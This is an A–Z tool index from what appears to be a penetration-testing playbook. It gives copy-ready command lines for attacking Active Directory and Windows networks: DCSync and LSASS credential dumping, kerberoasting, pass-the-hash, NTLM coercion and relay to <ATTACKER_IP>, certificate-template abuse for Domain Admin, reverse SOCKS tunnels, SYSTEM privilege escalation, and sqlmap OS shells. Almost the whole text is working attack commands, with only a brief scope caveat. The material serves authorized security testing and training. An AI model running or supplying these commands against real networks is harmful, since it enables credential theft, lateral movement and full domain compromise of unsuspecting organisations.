# 14 — Tool Index (A–Z arsenal)

**Purpose:** search a tool or technique here and get *what it is → which phase → the commands you'll
actually run*, so you can pick your option fast. Every tool links back to the phase file where it's
used in context. Same placeholder legend as `00`. This is a quick-pick reference, **not** a substitute
for understanding each command before you run it.

> Search tips: try the binary name (`evil-winrm`, `nxc`, `certipy`), the technique (`kerberoast`,
> `dcsync`, `esc1`, `pass-the-hash`), or the protocol/port (`smb`, `winrm`, `ldap`, `1433`).

## bloodhound / SharpHound / bloodhound-python / AzureHound — *AD attack-path mapping* → `05`, `09`, `11`
```bash
bloodhound-python -d <DOMAIN> -u '<USER>' -p '<PASS>' -ns <DC_IP> -c All --zip   # remote collect
nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --bloodhound --collection All --dns-server <DC_IP>
SharpHound.exe -c All --zip                                                       # on Windows
AzureHound.exe -u '<USER>' -p '<PASS>' list --tenant <TENANT_ID> -o azurehound.json  # cloud
# Queries: Shortest Paths to Domain Admins, Kerberoastable, Paths from Owned, Delegation
```

## bloodyAD — *read/write AD objects (privilege abuse)* → `05`, `09`
```bash
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASS>' --host <DC_IP> get writable
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASS>' --host <DC_IP> add groupMember '<GROUP>' '<YOU>'
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASS>' --host <DC_IP> set password '<TARGET>' 'New<PASS>!'
```

## certipy / Certify — *AD CS enumeration & ESC abuse* → `03` (ESC8), `09`
```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -enabled -stdout
certipy req  -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA>' -template '<T>' -upn 'Administrator@<DOMAIN>'  # ESC1
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>          # cert → TGT + NT hash
certipy shadow auto -u '<USER>@<DOMAIN>' -p '<PASS>' -account '<TARGET>' -dc-ip <DC_IP>
certipy relay -target 'http://<CA_IP>' -template DomainController                # ESC8 relay
```

## chisel — *TCP/SOCKS tunneling & pivoting* → `08`
```bash
./chisel server -p 8080 --reverse                          # attacker
./chisel client <ATTACKER_IP>:8080 R:socks                 # target → SOCKS on attacker:1080
proxychains nxc smb <INTERNAL_SUBNET> -u '<USER>' -p '<PASS>'
```

## coercer / PetitPotam / printerbug / dfscoerce — *auth coercion* → `03`, `09`
```bash
coercer coerce -u '<USER>' -p '<PASS>' -t <TARGET_IP> -l <ATTACKER_IP>   # many methods
impacket-petitpotam <ATTACKER_IP> <DC_IP>                                # MS-EFSRPC
printerbug.py '<DOMAIN>/<USER>:<PASS>'@<DC_IP> <ATTACKER_IP>             # MS-RPRN spooler
dfscoerce.py -u '<USER>' -p '<PASS>' <ATTACKER_IP> <DC_IP>               # MS-DFSNM
# → point coerced auth at ntlmrelayx (LDAPS RBCD/shadow, or AD CS ESC8)
```

## enum4linux-ng — *SMB/RPC/LDAP host enumeration* → `02`
```bash
enum4linux-ng -A <TARGET_IP>          # users, groups, shares, policy, OS
```

## evil-winrm — *interactive WinRM shell (5985/5986)* → `01`, `08`
```bash
evil-winrm -i <TARGET_IP> -u '<USER>' -p '<PASS>'
evil-winrm -i <TARGET_IP> -u '<USER>' -H '<NTHASH>'                 # pass-the-hash
evil-winrm -i <TARGET_IP> -u '<USER>' -p '<PASS>' -S               # SSL (5986)
evil-winrm -i <TARGET_IP> -u '<USER>' -p '<PASS>' -s /opt/scripts/ -e /opt/bins/
#   in-session: upload / download / menu / Bypass-4MSI ; load a .ps1 from -s then call its functions
nxc winrm <TARGET_IP> -u '<USER>' -p '<PASS>'                       # check WinRM access first
```

## ffuf / feroxbuster / gobuster — *web content & vhost discovery* → `10`
```bash
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fc 404
ffuf -u http://<TARGET_IP>/ -H "Host: FUZZ.<DOMAIN>" -w subdomains.txt -fs <baseline>   # vhost
feroxbuster -u http://<TARGET_IP> -w raft-medium-directories.txt
gobuster dir -u http://<TARGET_IP> -w common.txt -x php,aspx,jsp,txt,bak
```

## gpp-decrypt — *decrypt SYSVOL Groups.xml cpassword* → `04`
```bash
gpp-decrypt '<cpassword-blob>'      # cpassword found in \\<DC>\SYSVOL\...\Groups.xml
```

## hashcat / john — *offline password cracking* → `04`
```bash
hashcat -m 5600  netntlmv2.txt rockyou.txt -r best64.rule    # Responder NetNTLMv2
hashcat -m 18200 asrep.txt      rockyou.txt -r best64.rule    # AS-REP
hashcat -m 13100 kerb.txt       rockyou.txt -r best64.rule    # Kerberoast TGS
hashcat -m 1000  nt.txt         rockyou.txt                   # raw NT
hashcat -m 16500 jwt.txt        rockyou.txt                   # JWT (HS256 secret)
john --format=krb5tgs kerb.txt --wordlist=rockyou.txt
```

## impacket (suite) — *AD/Windows protocol Swiss-army* → `03`,`04`,`06`,`08`,`09`,`11`
```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>          # SAM/LSA/cached
impacket-secretsdump -just-dc-user Administrator '<DOMAIN>/<USER>:<PASS>'@<DC_IP>   # DCSync
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'  # kerberoast
impacket-GetNPUsers  <DOMAIN>/ -no-pass -usersfile users.txt -format hashcat        # AS-REP
impacket-psexec  <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>             # exec (loud)
impacket-wmiexec <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>             # exec (quiet default)
impacket-smbexec <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>
impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP> -windows-auth
impacket-ntlmrelayx -tf targets.txt -smb2support -socks          # relay
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTHASH>                 # PtT / overpass-the-hash
impacket-getST  -spn cifs/<FQDN> -impersonate Administrator <DOMAIN>/<svc>:'<PASS>'  # delegation
impacket-addcomputer / impacket-rbcd                             # RBCD attack
```

## kerbrute — *Kerberos user enum & spray (no lockout on enum)* → `02`, `04`
```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASS>'
```

## ldapsearch / windapsearch / ldapdomaindump — *LDAP directory queries* → `02`, `05`
```bash
ldapsearch -x -H ldap://<DC_IP> -b "DC=<dc>,DC=<dc>" -s sub "(objectClass=user)" sAMAccountName
windapsearch -d <DOMAIN> --dc <DC_IP> -U
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' <DC_IP>
```

## ligolo-ng — *clean L3 pivot tunnel (preferred)* → `08`
```bash
# attacker: ./proxy -selfcert   (then add a route to the internal subnet via the ligolo interface)
# target:   ./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

## lsassy / nanodump / mimikatz — *credential extraction from memory* → `04`, `07`, `09`
```bash
lsassy -d <DOMAIN> -u '<USER>' -p '<PASS>' <TARGET_IP>
nxc smb <TARGET_IP> -u '<USER>' -p '<PASS>' -M nanodump
# mimikatz (on Windows foothold): sekurlsa::logonpasswords | lsadump::sam | lsadump::dcsync /user:krbtgt
```

## masscan / nmap / netdiscover / fping — *host & service discovery* → `02`
```bash
nmap -p- -sS -Pn -T4 --min-rate 2000 -iL live.txt -oA scans/tcp_full
nmap -sV -sC -Pn -p <ports> -iL live.txt -oA scans/tcp_services
nmap -sU -Pn --top-ports 100 -iL live.txt -oA scans/udp_top
masscan -p1-65535 <SUBNET> --rate 10000 -oL scans/masscan.txt
```

## mitm6 — *IPv6/DHCPv6 DNS takeover* → `03`
```bash
mitm6 -d <DOMAIN>
impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh wpad.<DOMAIN> --delegate-access
```

## netexec (nxc) — *multi-protocol swiss-army (ex-crackmapexec)* → all internal phases
```bash
nxc smb   <SUBNET>                                     # OS/host/domain/signing sweep
nxc smb   <TARGET_IP> -u '<USER>' -p '<PASS>' --shares --sam --lsa
nxc smb   <SUBNET> -u '<USER>' -H '<NTHASH>' --continue-on-success   # PtH sweep / find local admin
nxc smb   <SUBNET> -u '<USER>' -p '<PASS>' -x 'whoami' --continue-on-success
nxc ldap  <DC_IP> -u '<USER>' -p '<PASS>' --kerberoasting k.txt --asreproast a.txt
nxc ldap  <DC_IP> -u '<USER>' -p '<PASS>' -M laps -M adcs -M maq
nxc winrm <TARGET_IP> -u '<USER>' -p '<PASS>'
nxc mssql <TARGET_IP> -u '<USER>' -p '<PASS>' -x 'whoami'
#   modules: -M spider_plus -M nanodump -M zerologon -M petitpotam -M printnightmare -M ms17-010
```

## PowerView / PowerUp / SharpUp / Seatbelt / winPEAS / linPEAS — *enum & privesc* → `05`, `07`
```powershell
Get-DomainUser -SPN ; Get-DomainUser -PreauthNotRequired ; Find-LocalAdminAccess   # PowerView (05)
Find-InterestingDomainAcl -ResolveGUIDs ; Get-DomainGroupMember 'Domain Admins' -Recurse
Invoke-AllChecks ; Get-ModifiableService ; Invoke-ServiceAbuse -Name '<svc>'       # PowerUp (07)
.\Seatbelt.exe -group=all ; .\SharpUp.exe audit ; .\winPEASx64.exe                 # (07)
./linpeas.sh ; sudo -l ; find / -perm -4000 -type f 2>/dev/null                    # Linux (07)
```

## PrintSpoofer / GodPotato / JuicyPotatoNG — *SeImpersonate → SYSTEM* → `07`
```cmd
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p cmd.exe
```

## Responder — *LLMNR/NBT-NS/mDNS poisoning → NetNTLM capture* → `03`
```bash
responder -I <ATTACKER_INT> -A          # analyze only (safe first)
responder -I <ATTACKER_INT>             # live poison
responder -I <ATTACKER_INT> -wF         # WPAD + force auth (louder)
# to RELAY instead: set SMB=Off, HTTP=Off in Responder.conf so ntlmrelayx can bind
```

## Rubeus — *Windows Kerberos abuse* → `04`, `08`, `09`
```cmd
Rubeus.exe kerberoast /rc4opsec /outfile:kerb.txt          # crackable-only, quieter
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asktgt /user:<USER> /rc4:<NTHASH> /ptt          # overpass-the-hash → pass-the-ticket
Rubeus.exe s4u /user:<svc> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<FQDN> /ptt
Rubeus.exe monitor /interval:5                             # harvest tickets (unconstrained deleg)
```

## sqlmap — *automated SQL injection* → `06`, `10`
```bash
sqlmap -r request.txt --batch --dbs                        # from a saved Burp request
sqlmap -r request.txt --batch -D <db> --dump
sqlmap -r request.txt --batch --os-shell                   # RCE (confirm in scope — changes target)
```

## smbclient / smbmap / manspider — *share access & data hunting* → `02`, `12`
```bash
smbclient -L //<TARGET_IP>/ -N ; smbclient //<TARGET_IP>/<SHARE> -N
smbmap -H <TARGET_IP> -u guest -p ''
manspider <SUBNET> -u '<USER>' -p '<PASS>' -f passw cred secret ssn account confidential
```

## targetedKerberoast — *set SPN → roast → remove (needs write over target)* → `04`, `09`
```bash
targetedKerberoast.py -d <DOMAIN> -u '<USER>' -p '<PASS>' --dc-ip <DC_IP>
```

## Cloud tooling — *AADInternals / ROADtools / MicroBurst / Pacu / ScoutSuite* → `11`
```bash
roadrecon auth -u '<USER>' -p '<PASS>' ; roadrecon gather ; roadrecon gui
o365spray --enum --domain <DOMAIN> -U users.txt
pacu                       # AWS ; ScoutSuite aws|gcp|azure for posture audit
# AADInternals / Invoke-AzAudit / Invoke-EntraAudit / MicroBurst — see 11
```
